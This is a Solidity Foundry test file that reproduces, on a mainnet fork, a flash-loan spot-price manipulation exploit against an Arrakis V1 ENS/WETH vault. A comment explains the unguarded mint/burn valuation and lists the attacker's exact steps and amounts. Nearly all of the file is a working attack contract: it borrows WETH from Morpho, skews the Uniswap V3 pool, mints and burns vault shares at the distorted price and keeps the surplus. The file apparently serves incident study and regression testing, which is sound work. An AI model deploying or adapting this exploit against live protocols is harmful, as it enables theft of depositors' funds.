// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Arrakis Finance V1 (G-UNI) ENS/WETH vault — Uniswap V3 spot-price manipulation of mint/burn —
// Ethereum mainnet, 2026-08. Attacker net surplus ~2.9414 ETH in a single flash-loan-funded tx.
//
// Exploit tx   : 0x6ae3af4b2f25a56594de99cfb31369150dd9ac059c49efe04b9e3e0163dbc672 (block 25817966)
// Attacker EOA : 0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44
// Attack ctrt  : 0x028d9C17B1a097e7e115A6400203df86339BAf4a (original; NOT replayed here)
// Victim vault : 0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe (Arrakis V1 G-UNI ENS/WETH, proxy;
//                impl ArrakisVaultV1 0xd68b055fB444D136e3ac4Df023f4c42334F06395)
//
// Root cause (verified against the on-chain trace and the verified ArrakisVaultV1 source, NOT a
// key/signer/admin compromise): the vault values its Uniswap V3 position for the permissionless
// mint()/burn() deposit-withdraw path off the pool's INSTANTANEOUS slot0() spot price
// (getUnderlyingBalances -> LiquidityAmounts on the live sqrtPriceX96). The contract's TWAP /
// deviation guard wraps only the manager rebalance() path; mint()/burn() have no TWAP and no
// deviation check. So an unprivileged caller can push the V3 tick with a swap, mint shares at the
// skewed valuation, restore the tick, and burn the shares for a richer token mix than deposited.
//
// Exact sequence and amounts, reconstructed 1:1 from the trace as ordinary typed calls (no bytecode
// blob, no raw calldata replay, no redeploy of the original attack contract). token0 = WETH,
// token1 = ENS. All inside one Morpho Blue flash loan:
//   1. flashLoan 1,800 WETH from Morpho.
//   2. swap 150 WETH -> ENS on the V3 pool down to the min-price bound (skews the tick): ~145.42
//      WETH in, ~13,292.5 ENS out.
//   3. vault.mint(4486619135659964587643, this): deposit ~1,253.39 WETH + ~13,159.59 ENS for the
//      shares, priced at the skewed spot.
//   4. swap ~132.93 ENS -> WETH (partial tick restore).
//   5. vault.burn(same shares, this): redeem ~1,248.41 WETH + ~13,283.30 ENS — a WETH-poorer but
//      ENS-richer mix than was deposited.
//   6. swap the entire ENS balance back to WETH, then repay the 1,800 WETH flash loan.
//   The ~2.9414 WETH left over is the profit. (On-chain the attack contract skimmed a fixed 0.05
//   ETH tip to 0x4838B106... and forwarded the rest to the EOA; that tip is not part of the
//   vulnerability, so this PoC measures the raw WETH surplus and omits the skim.)
//
// The vulnerable valuation math runs inside the vault's and pool's real on-chain contracts on the
// fork; this file only issues the same public calls the attacker did, with the on-chain amounts.
//
// forge test --contracts src/test/2026-08/ArrakisGUNI_exp.sol -vvv

interface IMorpho {
    function flashLoan(
        address token,
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IUniV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface IArrakisVaultV1 {
    function mint(
        uint256 mintAmount,
        address receiver
    ) external returns (uint256 amount0, uint256 amount1, uint128 liquidityMinted);
    function burn(
        uint256 burnAmount,
        address receiver
    ) external returns (uint256 amount0, uint256 amount1, uint128 liquidityBurned);
}

contract ArrakisGUNIAttack {
    IMorpho internal constant MORPHO = IMorpho(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IUniV3Pool internal constant POOL = IUniV3Pool(0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3);
    IArrakisVaultV1 internal constant VAULT = IArrakisVaultV1(0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe);
    IERC20 internal constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // token0
    IERC20 internal constant ENS = IERC20(0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72); // token1

    uint160 internal constant MIN_SQRT = 4_295_128_740; // MIN_SQRT_RATIO + 1
    uint160 internal constant MAX_SQRT = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341; // MAX - 1

    // Exact on-chain amounts.
    uint256 internal constant FLASH = 1800e18;
    uint256 internal constant SKEW_WETH_IN = 150e18; // swapped down to the min-price bound
    uint256 internal constant MINT_SHARES = 4_486_619_135_659_964_587_643;
    uint256 internal constant RESTORE_ENS_IN = 132_925_127_733_721_320_656;

    address internal immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() external returns (uint256 profit) {
        MORPHO.flashLoan(address(WETH), FLASH, "");
        profit = WETH.balanceOf(address(this));
        WETH.transfer(owner, profit); // forward the surplus to the caller
    }

    // Morpho hands over 1,800 WETH here and reclaims it via transferFrom when this returns.
    function onMorphoFlashLoan(
        uint256 assets,
        bytes calldata
    ) external {
        require(msg.sender == address(MORPHO), "not morpho");
        WETH.approve(address(MORPHO), assets);
        WETH.approve(address(VAULT), type(uint256).max);
        ENS.approve(address(VAULT), type(uint256).max);

        // Skew the tick: dump WETH for ENS down to the min-price bound.
        POOL.swap(address(this), true, int256(SKEW_WETH_IN), MIN_SQRT, "");

        // Mint vault shares at the distorted spot valuation.
        VAULT.mint(MINT_SHARES, address(this));

        // Partially restore the tick.
        POOL.swap(address(this), false, int256(RESTORE_ENS_IN), MAX_SQRT, "");

        // Redeem the shares for the richer token mix.
        VAULT.burn(MINT_SHARES, address(this));

        // Sell the entire ENS balance back to WETH.
        POOL.swap(address(this), false, int256(ENS.balanceOf(address(this))), MAX_SQRT, "");
    }

    // Pay the Uniswap V3 pool the token it is owed for each swap.
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata
    ) external {
        require(msg.sender == address(POOL), "not pool");
        if (amount0Delta > 0) WETH.transfer(address(POOL), uint256(amount0Delta));
        if (amount1Delta > 0) ENS.transfer(address(POOL), uint256(amount1Delta));
    }
}

contract ArrakisGUNI_exp is BaseTestWithBalanceLog {
    address internal constant ATTACKER = 0xa3B096e4df1247794599a37Af8F5b8CB05D5EB44;
    IERC20 internal constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    uint256 internal constant FORK_BLOCK = 25_817_965; // parent of the exploit block 25817966
    uint256 internal constant EXPECTED_PROFIT = 2_941_350_352_900_037_140; // ~2.9414 WETH

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(0x7c687f775A3b73BBAb0E15832F24caaB5D53bDDe, "ArrakisVault");
        vm.label(0xb9C4a5522a2f8bA9E2fF7063Df8C02ed443337A3, "UniV3Pool");
    }

    function testExploit() public {
        uint256 before = WETH.balanceOf(ATTACKER);

        // Permissionless: run it as the attacker EOA and forward the surplus there.
        vm.prank(ATTACKER, ATTACKER);
        ArrakisGUNIAttack exploit = new ArrakisGUNIAttack();
        uint256 profit = exploit.attack();

        uint256 gain = WETH.balanceOf(ATTACKER) - before;
        emit log_named_decimal_uint("attacker WETH surplus", gain, 18);

        assertEq(gain, profit, "surplus landed with attacker");
        // Reproduced surplus matches the reported ~2.9414 ETH.
        assertApproxEqAbs(gain, EXPECTED_PROFIT, 0.02e18, "surplus off expected ~2.9414 ETH");
    }
}
